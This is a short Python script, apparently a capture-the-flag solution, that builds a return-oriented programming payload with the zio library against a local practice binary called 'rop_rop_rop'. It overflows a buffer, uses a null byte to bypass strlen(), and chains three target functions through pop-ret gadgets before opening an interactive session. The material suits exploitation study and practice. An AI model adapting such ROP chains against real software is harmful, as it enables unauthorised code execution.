#!/usr/bin/env python
# encoding:utf-8

import zio

payload =  "A" * 7 + "\x00" # 使用 0x00 绕过 strlen()
payload +=  "@" * 8 # 
payload +=  zio.l32(0x804871e) # Step1() 的地址
payload +=  zio.l32(0x8048869) # pop,pop,pop,ret 的地址
payload +=  "\x00" * 4 # Step1 的参数3
payload +=  "AAAA" # Step1 的参数2
payload += zio.l32(0xA2B3C4D5) # Step1 的参数 1

payload +=  zio.l32(0x8048766) # Step2() 的地址
payload +=  zio.l32(0x804886A) # pop,pop,ret 的地址
payload +=  zio.l32(0xFF25A7D4) # Step2 的参数 1
payload +=  "AAAA" # Step2 的参数2

payload +=  zio.l32(0x80487A3) # Step2() 的地址
payload += "BBBB" # 已经执行到 Step3() , 再如何跳转已经无所谓了 
payload +=  zio.l32(0xFFFFFFFF) # Step3 的参数 1
payload +=  zio.l32(0xC0C0C0C) # Step3 的参数2
payload +=  zio.l32(0x9A829A82) # Step3 的参数3

Io = zio.zio("./rop_rop_rop")
Io.readline()
Io.write(payload + "\n")
Io.interact()
